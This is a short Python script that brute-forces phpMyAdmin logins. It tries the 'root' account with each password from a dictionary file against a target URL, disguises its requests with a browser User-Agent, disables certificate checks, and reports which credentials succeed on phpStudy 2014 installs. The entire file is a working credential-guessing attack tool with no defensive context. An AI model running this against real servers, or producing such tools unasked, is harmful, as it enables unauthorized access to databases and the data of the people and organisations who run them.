import requests
import argparse


def phpmyadminFuzz(url, username, password_list):
    url = url.rstrip('/') + '/phpmyadmin/index.php'  # Ensure URL is well-formed
    for i in username:  # Iterate through usernames
        for j in password_list:  # Iterate through passwords
            data = {
                "pma_username": i,
                "pma_password": j,
                "server": "1",
            }
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                }
                r = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=True, timeout=10)
                if r.status_code == 200 and 'phpMyAdmin phpStudy 2014' in r.text:
                    print(f'\033[32m[+] {url} Login Success! username: {i} & password: {j}\033[0m')
                    return  # Exit after successful login
                else:
                    print(f'\033[31m[-] {url} Login Failed for username: {i} & password: {j}\033[0m')
            except requests.exceptions.RequestException as e:
                print(f'[!] {url} is timeout or error occurred: {e}')
                break  # Exit loop on error


def load_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute force phpMyAdmin login')
    parser.add_argument('url', help='URL of the phpMyAdmin instance')
    parser.add_argument('-r', '--passwords', required=True, help='Path to the password dictionary file')

    args = parser.parse_args()

    # Default username list
    username = ['root']
    # Load passwords from the specified file
    password_list = load_passwords(args.passwords)

    phpmyadminFuzz(args.url, username, password_list)





